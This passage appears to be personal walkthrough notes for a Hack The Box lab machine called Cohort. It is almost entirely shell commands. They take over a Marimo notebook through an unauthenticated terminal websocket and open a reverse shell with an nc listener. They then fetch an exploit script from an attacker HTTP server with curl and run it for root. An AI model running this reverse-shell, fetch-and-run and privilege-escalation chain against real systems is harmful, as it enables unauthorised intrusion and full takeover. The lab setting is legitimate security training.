KEY=$(head -c 16 /dev/urandom | base64)
curl -sk -i \
  -H "Connection: Upgrade" \
  -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Sec-WebSocket-Key: $KEY" \
  https://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws
# expect: 101 Switching Protocols + a shell banner, no credentials sent
```

### Exploit Marimo → shell

```bash
nc -lvnp 4444
python3 shell.py https://nb-1be3782a8afd3ad5.cohort.htb --revshell LHOST 4444
# in shell:
python3 -c 'import pty;pty.spawn("/bin/bash")'   # Ctrl-Z, then: stty raw -echo; fg
export TERM=xterm
cat /home/marimo/user.txt
```

### Privesc → root

```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
cat /etc/crontab
ps aux --sort=-%mem | head -40
pkcon backend-details 2>/dev/null
# stage from attacker:
cd ~/Labs/HTB/SN11/Cohort/Pack2TheRoot && python3 -m http.server 8000
# on target:
cd /tmp
curl -s http://LHOST:8000/exploit.py -o exploit.py
head -5 exploit.py            # verify: import os ... NOT <!DOCTYPE HTML>
python3 /tmp/exploit.py       # re-run if the race misses
id
cat /root/root.txt
```





